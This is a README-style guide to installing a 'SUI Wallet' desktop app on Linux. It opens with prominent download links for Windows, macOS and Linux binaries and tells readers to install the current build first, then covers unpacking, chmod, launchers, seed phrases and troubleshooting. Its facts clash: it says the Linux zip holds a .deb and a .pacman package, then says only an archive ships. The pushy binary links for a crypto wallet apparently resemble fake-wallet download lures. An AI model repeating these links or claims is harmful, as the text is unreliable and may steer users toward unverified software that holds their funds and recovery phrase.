![SUI Wallet](assets/banner-article.png)

# Installing SUI Wallet on Linux

The Linux .zip holds a .deb and a .pacman package; pick the one your distribution reads.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

On Linux, SUI Wallet ships as an archive rather than a package: unpack it, make the application
executable, and run it. The published requirement is x64, Ubuntu 20.04 or later, or an equivalent
distribution. There is no system-wide install and no repository to add, so a current release is a
download away rather than an upgrade command.

## The Linux file and what it needs

The Linux build is the archive on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest), the third of the three files, and it is where the reported problems are fixed. It is built for x64, and the published requirement is Ubuntu 20.04 or later, or a distribution equivalent to it.

Two practical consequences follow from shipping an archive:

- **Nothing is installed system-wide.** The application lives wherever you unpacked it, which means you
  choose the location and you are responsible for replacing it when a new release lands.
- **Desktop libraries are assumed.** A minimal or server install lacks the libraries a graphical
  application needs. On a machine without a desktop session, install the distribution's desktop base
  packages before blaming the wallet.

[SUI Wallet system requirements](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-system-requirements.md) carries the requirement strings for all three platforms in one
place, which is the fastest way to check a machine you are unsure about.

Check the archive before you unpack it. The release notes publish a SHA-256 digest for each file, and
`sha256sum` on the downloaded archive produces the same value; if the two differ, the file did not arrive
intact or did not come from the release page, and unpacking it is not worth the risk.

## Unpacking and making it executable

Unpack the archive into a folder you will remember, since the application runs from wherever it sits. `~/Applications` and `~/opt` are both reasonable choices for a single-user machine, and then the application file needs execute permission before it will launch.

```
chmod +x <the-application-file>
```

Archives do not always preserve the executable bit, so this step is not optional even when the file looks
ready. Double-clicking an application that lacks the bit produces nothing at all, which is why a silent
failure is the usual first impression on Linux.

## Running it

From a terminal, run the application by path. From the desktop, create a launcher entry that points at
the same path: a `.desktop` file in `~/.local/share/applications` with the name, the executable path and
an icon is enough, and it makes the app appear in the application menu like anything else.

A first run from the terminal is worth doing once even if you plan to use the launcher, because the
terminal prints the reason when the app cannot start - a missing library names itself there, and that
message is the difference between a five-minute fix and a reinstall.

## First run

The welcome screen asks the same of every platform: create an account, or restore one from 24 words. No email address and no account with a server, because the keys are generated and stored on this machine and nothing about the account lives anywhere else.

If you create, the 24-word phrase is shown once. Write it down before the wallet holds anything; the
phrase is the account, and no support channel can rebuild an account without it. The seed phrase guide
covers that screen step by step.

## When the application does not start

Three causes cover nearly every Linux first launch: the executable bit was lost in the unpack, a desktop library is missing, or the build predates the current release. Running the application from a terminal rather than from a launcher is what tells the three apart.

- **Permission denied** - the chmod step was skipped, or the file was unpacked by a tool that dropped the
  mode bits.
- **Error while loading shared libraries** - a desktop base package is absent; the message names the
  library.
- **Nothing at all, or an immediate exit** - usually an old build. Take the current release from
  [the release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

The first-launch guide covers the same three causes for readers who would rather read than run a
terminal command, and it names what the in-app diagnostics panel shows once the app does open.

## Updating an archive install

There is no package manager step. Download the current release and unpack it over the folder you used
before. Unpacking over the old folder replaces the application, not the account: the phrase is yours and
does not change with a build.

The changelog lists one line per release, newest first, so "is this build current" is answerable without
guessing from a file date. [Updating SUI Wallet to the latest release](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/updating-sui-wallet-to-the-latest-release.md) covers the same update for
every platform, including what survives it.

## FAQ

### Is there a .deb or an AppImage?

The release publishes an archive. If your distribution's packaging is what you need, the archive still
runs: unpack it, make it executable, and point a launcher at it.

### Do I need root?

Not for the wallet itself. Unpacking into your home folder and running the application from there needs
no elevation; only a system-wide location would, and the wallet does not need one.

### Why does the app start from a terminal but not from the menu?

A launcher entry that points at the wrong path, or at a copy that was replaced by an update, fails
silently. Check the path in the `.desktop` file against the folder you actually unpacked into, and check
that the entry points at the executable rather than at the folder that holds it. Running the app once
from a terminal after an update catches the same mistake before it becomes a mystery.

### Can several users on one machine each have their own wallet?

Yes, in the ordinary way: each user unpacks their own copy and holds their own profile, and none of them
can read another's phrase. On a shared machine, the phrase is still the thing that must not be left
behind - the shared-PC guide covers removal.
